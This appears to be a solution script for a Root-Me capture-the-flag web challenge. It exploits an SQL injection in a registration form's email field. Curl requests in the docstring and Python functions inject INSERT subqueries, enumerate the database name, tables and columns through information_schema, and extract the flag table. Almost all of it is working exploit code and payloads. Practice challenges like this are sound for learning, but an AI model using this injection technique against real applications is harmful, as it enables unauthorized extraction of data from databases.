import requests
import re
import string
import random
    
    
"""
First i have notice you can inject an insert to the email argument on the registration form and we can see it on login page when logged in
    
    
registration page request
    
curl 'http://challenge01.root-me.org/web-serveur/ch33/?action=register'
        -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
        -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        -H 'Accept-Language: it,en-US;q=0.7,en;q=0.3'
        --compressed
        -H 'Content-Type: application/x-www-form-urlencoded'
        -H 'Origin: http://challenge01.root-me.org'
        -H 'Connection: keep-alive'
        -H 'Referer: http://challenge01.root-me.org/web-serveur/ch33/?action=register'
        -H 'Upgrade-Insecure-Requests: 1'
        --data-raw "username=m3&password=m&email='),('a','pw', (SELECT table_name from information_schema.tables limit 1)); -- -"
    
    
login page request
    
curl 'http://challenge01.root-me.org/web-serveur/ch33/?action=login'
        -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
        -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        -H 'Accept-Language: it,en-US;q=0.7,en;q=0.3'
        --compressed
        -H 'Content-Type: application/x-www-form-urlencoded'
        -H 'Origin: http://challenge01.root-me.org'
        -H 'Connection: keep-alive'
        -H 'Referer: http://challenge01.root-me.org/web-serveur/ch33/?action=login'
        -H 'Upgrade-Insecure-Requests: 1'
        --data-raw 'username=a&password=pw'
    
    
"""
    
# Set a value on database using injection
def getValue(username):
    data = {'username':"{0}".format(username),'password':'pw'}
    req = requests.post('http://challenge01.root-me.org/web-serveur/ch33/?action=login', data=data, headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'})
    match = re.search("Email : ([^<]+)<br />", req.text)
    if match:
        return match.group(1)
    
    
# Get a injected value
def setValue(username, payload):
    data = {'username':"{0}{0}".format(username),'password':'pw', 'email': payload}
    req = requests.post('http://challenge01.root-me.org/web-serveur/ch33/?action=register', data=data, headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'})
    if re.search("You can logged in !", req.text):
        return True
    return False
    
    
# get current database name
def getDatabaseName(username):
    
    i = 0
    x = False
    t_username = ""
    while x != True:
        t_username = "{0}{1}".format(username,i)
        payload = "'),('{0}','pw', (SELECT database() LIMIT 1)); -- -".format(t_username)
        x = setValue(t_username,payload)
        i += 1
    
    return getValue(t_username)
    
    
# get tables of database
def getTables(username, db):
    
    i = 0
    x = False
    t_username = ""
    while x != True:
        t_username = "{0}{1}".format(username,i)
        payload = "'),('{0}','pw', (SELECT group_concat(table_name) FROM information_schema.columns WHERE table_schema='{1}' LIMIT 1)); -- -".format(t_username, db)
        x = setValue(t_username,payload)
        i += 1
    
    value = getValue(t_username).split(',')
    value = [x for x in value if x]
    value = list(set(value))
    return value
    
    
def getColumns(username, db, table):
    
    i = 0
    x = False
    t_username = ""
    while x != True:
        t_username = "{0}{1}".format(username,i)
        payload = "'),('{0}','pw', (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='{1}' AND table_name='{2}' LIMIT 0,1)); -- -".format(t_username, db, table)
        x = setValue(t_username,payload)
        i += 1
    
    value = getValue(t_username).split(',')
    value = [x for x in value if x]
    value = list(set(value))
    return value
    
    
    
################ main ######################
    
print ("Retrieving Database name ...")
db_name =  getDatabaseName(random.choice(string.ascii_letters))
if db_name is not None:
    print ("Database: ", db_name)
    
    
print ("Retrieving Tables ...")
tables =  getTables(random.choice(string.ascii_letters), db_name)
if tables is not None:
    for table in tables:
        print (table)
    
    for table in tables:
        print ("Retrieving Columns for table", table, "...")
        columns = getColumns(random.choice(string.ascii_letters), db_name, table)
    
        for column in columns:
            print (column)
    
    
print ("Now we know that there is a flag table with a flag column, lets make a call to get the flag")
i = 0
x = False
username = random.choice(string.ascii_letters)
t_username = ""
while x != True:
    t_username = "{0}{1}".format(username,i)
    payload = "'),('{0}','pw', (SELECT flag FROM flag LIMIT 1)); -- -".format(t_username)
    x = setValue(t_username,payload)
    i += 1
    
print (getValue(t_username))